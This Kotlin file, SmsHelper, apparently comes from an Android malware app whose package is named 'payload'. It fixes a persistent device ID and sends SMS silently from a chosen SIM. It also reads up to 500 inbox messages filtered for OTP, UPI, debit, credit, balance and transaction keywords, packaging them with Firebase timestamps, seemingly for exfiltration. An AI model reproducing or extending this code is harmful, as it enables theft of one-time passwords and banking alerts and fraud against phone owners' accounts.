package com.payload.jansiix0ne.util

import android.content.Context
import android.provider.Telephony
import android.telephony.SmsManager
import android.telephony.SubscriptionInfo
import android.telephony.SubscriptionManager
import android.util.Log
import com.payload.jansiix0ne.models.SmsModel
import java.util.Date
import java.util.UUID

/**
 * Helper class for SMS operations
 */
object SmsHelper {
    private const val TAG = "SmsHelper"

    /**
     * Get device ID from SharedPreferences or generate a new one
     */
    fun getDeviceId(context: Context): String {
        val prefs = context.getSharedPreferences("device_info_prefs", Context.MODE_PRIVATE)
        var deviceId = prefs.getString("device_id", null)
        
        if (deviceId.isNullOrEmpty() || deviceId == "unknown") {
            deviceId = android.provider.Settings.Secure.getString(
                context.contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            )
            
            if (deviceId.isNullOrEmpty() || deviceId == "unknown") {
                deviceId = UUID.randomUUID().toString()
            }
            
            prefs.edit().putString("device_id", deviceId).apply()
        }
        
        return deviceId
    }

    /**
     * Send SMS message using specified SIM slot
     */
    fun sendSms(
        context: Context,
        phoneNumber: String,
        message: String,
        simSlotIndex: Int = 0
    ): Boolean {
        return try {
            val subscriptionManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
            val activeSubscriptions = subscriptionManager?.activeSubscriptionInfoList
            
            if (activeSubscriptions.isNullOrEmpty()) {
                Log.e(TAG, "No active SIM cards found")
                return false
            }
            
            val subscriptionInfo: SubscriptionInfo? = if (activeSubscriptions.size == 1) {
                activeSubscriptions[0]
            } else {
                activeSubscriptions.find { it.simSlotIndex == simSlotIndex }
            }
            
            if (subscriptionInfo == null) {
                Log.e(TAG, "No active SIM found in slot $simSlotIndex")
                return false
            }
            
            val subscriptionId = subscriptionInfo.subscriptionId
            val smsManager = SmsManager.getSmsManagerForSubscriptionId(subscriptionId)
            val parts = smsManager.divideMessage(message)
            
            smsManager.sendMultipartTextMessage(phoneNumber, null, parts, null, null)
            
            Log.d(TAG, "SMS sent via SIM${subscriptionInfo.simSlotIndex} (subId=$subscriptionId) to $phoneNumber")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send SMS: ${e.message}", e)
            false
        }
    }

    /**
     * Read SMS messages from inbox matching specific keywords
     */
    fun readImportantSms(context: Context): List<SmsModel> {
        val smsList = mutableListOf<SmsModel>()
        val deviceId = getDeviceId(context)
        
        val keywords = arrayOf(
            "%OTP%", "%debited%", "%credited%", "%received%",
            "%A/C%", "%balance%", "%UPI%", "%sent%", "%upi%", "%txn%"
        )
        
        val selection = keywords.joinToString(" OR ") { "body LIKE ?" }
        val selectionArgs = keywords
        
        val cursor = context.contentResolver.query(
            Telephony.Sms.Inbox.CONTENT_URI,
            arrayOf("address", "body", "date"),
            selection,
            selectionArgs,
            "date DESC LIMIT 500"
        )
        
        cursor?.use {
            val addressIndex = it.getColumnIndex("address")
            val bodyIndex = it.getColumnIndex("body")
            val dateIndex = it.getColumnIndex("date")
            
            while (it.moveToNext()) {
                val address = it.getString(addressIndex)
                val body = it.getString(bodyIndex) ?: ""
                val date = Date(it.getLong(dateIndex))
                
                if (!address.isNullOrEmpty()) {
                    smsList.add(SmsModel(address, body, com.google.firebase.Timestamp(date), deviceId))
                }
            }
        }
        
        return smsList
    }
}
